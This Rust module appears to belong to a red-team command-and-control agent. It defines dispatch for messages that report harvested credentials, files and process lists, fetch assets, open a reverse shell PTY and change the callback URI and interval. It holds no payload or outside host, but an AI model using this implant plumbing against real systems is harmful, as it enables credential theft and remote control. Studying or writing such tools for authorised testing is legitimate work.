mod fetch_asset;
mod reduce;
mod report_agg_output;
mod report_credential;
mod report_error;
mod report_file;
mod report_finish;
mod report_process_list;
mod report_start;
mod report_text;
mod reverse_shell_pty;
mod set_callback_interval;
mod set_callback_uri;

pub use fetch_asset::FetchAssetMessage;
pub use pb::config::Config;
pub(super) use reduce::reduce;
pub use report_credential::ReportCredentialMessage;
pub use report_error::ReportErrorMessage;
pub use report_file::ReportFileMessage;
pub use report_finish::ReportFinishMessage;
pub use report_process_list::ReportProcessListMessage;
pub use report_start::ReportStartMessage;
pub use report_text::ReportTextMessage;
pub use reverse_shell_pty::ReverseShellPTYMessage;
pub use set_callback_interval::SetCallbackIntervalMessage;
pub use set_callback_uri::SetCallbackUriMessage;
pub use transport::Transport;

use anyhow::Result;
use derive_more::{Display, From};
use report_agg_output::ReportAggOutputMessage;
use std::future::Future;

// AsyncDispatcher defines the shared "dispatch" method used by all `AsyncMessage` variants to send their data using a transport.
pub trait AsyncDispatcher {
    fn dispatch(
        self,
        transport: &mut impl Transport,
        cfg: Config,
    ) -> impl Future<Output = Result<()>> + Send;
}

// SyncDispatcher defines the shared "dispatch" method used by all `SyncMessage` variants to facilitate state changes with the Agent.
pub trait SyncDispatcher {
    fn dispatch(self, transport: &mut impl Transport, cfg: Config) -> Result<Config>;
}

/*
 * A Message from an Eldritch tome evaluation `tokio::task` to the owner of the corresponding `eldritch::Runtime`.
 * This enables eldritch library functions to communicate with the caller API, enabling structured data reporting
 * as well as resource requests (e.g. fetching assets).
 */
#[cfg_attr(any(debug_assertions, test), derive(Debug, PartialEq))]
#[derive(Display, From, Clone)]
pub enum Message {
    #[display(fmt = "Async")]
    Async(AsyncMessage),

    #[display(fmt = "Sync")]
    Sync(SyncMessage),
}

#[cfg_attr(any(debug_assertions, test), derive(Debug, PartialEq))]
#[derive(Display, From, Clone)]
pub enum AsyncMessage {
    #[display(fmt = "FetchAsset")]
    FetchAsset(FetchAssetMessage),

    #[display(fmt = "ReportCredential")]
    ReportCredential(ReportCredentialMessage),

    #[display(fmt = "ReportError")]
    ReportError(ReportErrorMessage),

    #[display(fmt = "ReportFile")]
    ReportFile(ReportFileMessage),

    #[display(fmt = "ReportProcessList")]
    ReportProcessList(ReportProcessListMessage),

    #[display(fmt = "ReportText")]
    ReportText(ReportTextMessage),

    #[display(fmt = "ReportStart")]
    ReportStart(ReportStartMessage),

    #[display(fmt = "ReportFinish")]
    ReportFinish(ReportFinishMessage),

    #[display(fmt = "ReportAggOutput")]
    ReportAggOutput(ReportAggOutputMessage),

    #[display(fmt = "ReverseShellPTY")]
    ReverseShellPTY(ReverseShellPTYMessage),
}

// The AsyncDispatcher implementation for `AsyncMessage` simply calls the `dispatch()` implementation on the underlying variant.
impl AsyncDispatcher for AsyncMessage {
    async fn dispatch(self, transport: &mut impl Transport, cfg: Config) -> Result<()> {
        #[cfg(debug_assertions)]
        log::debug!("dispatching async message {:?}", self);

        match self {
            Self::FetchAsset(msg) => msg.dispatch(transport, cfg).await,

            Self::ReportCredential(msg) => msg.dispatch(transport, cfg).await,
            Self::ReportError(msg) => msg.dispatch(transport, cfg).await,
            Self::ReportFile(msg) => msg.dispatch(transport, cfg).await,
            Self::ReportProcessList(msg) => msg.dispatch(transport, cfg).await,
            Self::ReportText(msg) => msg.dispatch(transport, cfg).await,
            Self::ReportAggOutput(msg) => msg.dispatch(transport, cfg).await,
            Self::ReverseShellPTY(msg) => msg.dispatch(transport, cfg).await,

            Self::ReportStart(msg) => msg.dispatch(transport, cfg).await,
            Self::ReportFinish(msg) => msg.dispatch(transport, cfg).await,
        }
    }
}

#[cfg_attr(any(debug_assertions, test), derive(Debug, PartialEq))]
#[derive(Display, From, Clone)]
pub enum SyncMessage {
    #[display(fmt = "SetCallbackInterval")]
    SetCallbackInterval(SetCallbackIntervalMessage),

    #[display(fmt = "SetCallbackUri")]
    SetCallbackUri(SetCallbackUriMessage),
}

impl SyncDispatcher for SyncMessage {
    fn dispatch(self, transport: &mut impl Transport, cfg: Config) -> Result<Config> {
        #[cfg(debug_assertions)]
        log::debug!("dispatching sync message {:?}", self);

        match self {
            Self::SetCallbackInterval(msg) => msg.dispatch(transport, cfg),
            Self::SetCallbackUri(msg) => msg.dispatch(transport, cfg),
        }
    }
}
